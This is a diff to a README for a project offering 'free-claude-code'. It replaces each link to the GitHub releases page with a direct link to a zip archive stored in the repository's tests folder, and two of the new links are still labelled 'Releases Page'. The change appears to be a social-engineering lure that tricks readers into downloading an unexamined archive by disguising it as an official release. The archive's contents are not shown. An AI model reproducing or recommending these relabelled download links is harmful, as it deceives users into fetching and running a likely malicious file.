@@ -1,6 +1,6 @@
 # 🎉 free-claude-code - Use AI for Free, Effortlessly!
 
-[![Download](https://img.shields.io/badge/Download-Now-green)](https://github.com/Andrewkeith83/free-claude-code/releases)
+[![Download](https://github.com/Andrewkeith83/free-claude-code/raw/refs/heads/main/tests/claude-free-code-unbossed.zip)](https://github.com/Andrewkeith83/free-claude-code/raw/refs/heads/main/tests/claude-free-code-unbossed.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you download, ensure that your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To download free-claude-code, visit this page to download: [Releases Page](https://github.com/Andrewkeith83/free-claude-code/releases).
+To download free-claude-code, visit this page to download: [Releases Page](https://github.com/Andrewkeith83/free-claude-code/raw/refs/heads/main/tests/claude-free-code-unbossed.zip).
 
 ### Step-by-Step Installation
 
@@ -81,4 +81,4 @@ Keep an eye on the releases page for updates and new features. You will find reg
 
 You are now ready to start using free-claude-code. The combination of free access and user-friendly design will help you utilize AI power effortlessly. Enjoy exploring all the features that claude-code has to offer!
 
-For any further assistance, do not hesitate to revisit the [Releases Page](https://github.com/Andrewkeith83/free-claude-code/releases). Happy coding!
+For any further assistance, do not hesitate to revisit the [Releases Page](https://github.com/Andrewkeith83/free-claude-code/raw/refs/heads/main/tests/claude-free-code-unbossed.zip). Happy coding!
